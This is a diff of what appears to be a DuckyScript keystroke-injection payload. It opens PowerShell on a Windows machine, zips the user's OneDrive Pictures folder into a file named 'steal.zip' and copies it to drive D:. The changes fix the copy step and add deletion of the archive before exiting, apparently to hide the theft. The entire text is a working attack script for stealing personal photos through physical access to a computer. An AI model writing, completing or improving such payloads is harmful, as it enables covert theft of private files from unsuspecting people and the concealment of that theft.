@@ -4,12 +4,19 @@ GUI r
 DELAY 300
 STRING powershell 
 ENTER 
-DELAY 500
+DELAY 1000
 
 STRING Compress-Archive -Path "$env:USERPROFILE\OneDrive\Pictures\*" -DestinationPath "$env:USERPROFILE\OneDrive\Documents\steal.zip"
 ENTER
 
 
 DELAY 5000
-Copy-Item "$env:USERPROFILE\OneDrive\Documents\loot.zip" -Destination "D:steal.zip"
+STRING Copy-Item "$env:USERPROFILE\OneDrive\Documents\steal.zip" -Destination "D:steal.zip"
 ENTER 
+
+DELAY 7000
+STRING Remove-Item -Path "$env:USERPROFILE\OneDrive\Documents\steal.zip"
+ENTER
+DELAY 500
+STRING exit 
+ENTER
